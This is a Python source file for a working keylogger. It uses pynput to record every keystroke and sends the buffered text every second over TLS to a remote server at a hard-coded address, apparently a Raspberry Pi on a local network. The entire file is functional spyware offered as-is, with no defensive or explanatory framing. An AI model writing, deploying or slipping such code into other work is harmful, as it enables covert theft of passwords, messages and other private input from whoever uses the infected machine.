import pynput
import socket
import ssl
import threading
import time
from pynput.keyboard import Key, Listener

# Server details (replace with your Raspberry Pi's IP)
SERVER_HOST = '192.168.0.103'
SERVER_PORT = 4433

# Set up SSL context for the client
context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
context.load_verify_locations('server.crt')  # Path to the certificate

# Buffer to store keystrokes
keystroke_buffer = []

def on_press(key):
    """Capture keystrokes and add them to the buffer."""
    try:
        char = key.char  # For alphanumeric keys
    except AttributeError:
        char = str(key)  # For special keys like Key.space
    keystroke_buffer.append(char)

def send_keystrokes():
    """Send buffered keystrokes to the server every second."""
    while True:
        if keystroke_buffer:
            data = ''.join(keystroke_buffer)
            keystroke_buffer.clear()
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    with context.wrap_socket(s, server_hostname=SERVER_HOST) as ss:
                        ss.connect((SERVER_HOST, SERVER_PORT))
                        ss.sendall(data.encode())
                        print(f"Sent: {data}")
            except Exception as e:
                print(f"Error sending data: {e}")
        time.sleep(1)  # Send every second

# Start the sending thread
sending_thread = threading.Thread(target=send_keystrokes, daemon=True)
sending_thread.start()

# Start the keylogger
print("Keylogger started. Press keys to record.")
with Listener(on_press=on_press) as listener:
    listener.join()